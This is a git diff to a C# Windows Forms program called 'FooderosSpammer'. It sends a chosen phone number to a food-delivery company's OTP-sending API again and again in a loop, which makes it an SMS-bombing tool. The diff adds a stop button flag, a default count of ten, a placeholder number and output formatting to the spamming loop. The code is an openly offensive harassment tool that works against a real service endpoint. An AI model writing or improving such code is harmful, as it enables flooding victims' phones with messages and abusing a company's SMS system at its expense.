@@ -14,9 +14,12 @@ namespace FooderosSpammer
 {
     public partial class Form1 : Form
     {
+        public bool stop = false;
         public Form1()
         {
             InitializeComponent();
+            textBox1.PlaceholderText = "501234567";
+            textBox2.Text = "10";
         }
 
         private void textBox1_TextChanged(object sender, EventArgs e)
@@ -38,7 +41,6 @@ namespace FooderosSpammer
 
         private async Task startAsync(string number, int count)
         {
-
             var values = new Dictionary<string, string>
             {
                 {"phone", number},
@@ -51,8 +53,13 @@ namespace FooderosSpammer
 
             for (int i = 0; i < count; i++)
             {
+                if (stop)
+                {
+                    stop = false;
+                    break;
+                }
                 var response = await client.PostAsync("https://api.fooderos.com/api/v1/send/otp", content);
-                textBox3.Text += (i + 1) + ". " + number + " sent";
+                textBox3.Text += (i + 1) + ". " + number + " sent\r\n";
                 label5.Text = "" + ++sent;
             }
         }
